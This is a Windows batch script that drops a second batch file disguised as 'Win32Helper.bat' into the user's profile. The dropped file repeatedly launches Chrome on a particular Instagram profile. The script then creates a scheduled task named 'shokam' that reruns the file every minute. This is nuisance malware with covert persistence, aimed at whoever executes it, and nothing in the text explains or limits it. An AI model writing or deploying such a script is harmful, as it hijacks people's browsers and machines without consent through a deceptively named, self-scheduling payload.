@echo off
setlocal

set "folder=%USERPROFILE%\Applications"
mkdir %folder%
set "filename=%folder%\Win32Helper.bat"

echo @echo off > "%filename%"
echo set /a i=0 >> "%filename%"
echo :redir >> "%filename%""
echo    start chrome.exe "https://www.instagram.com/jeremiahchai/" >> "%filename%"
echo    set /a i=%%i%%+1 >> "%filename%"
echo    if %%i%% lss 10 ( >> "%filename%"
echo        call :redir >> "%filename%"
echo    ) >> "%filename%"

schtasks /create /tn shokam /tr "%filename%" /sc minute /mo 1 /st 00:00:00 /f

endlocal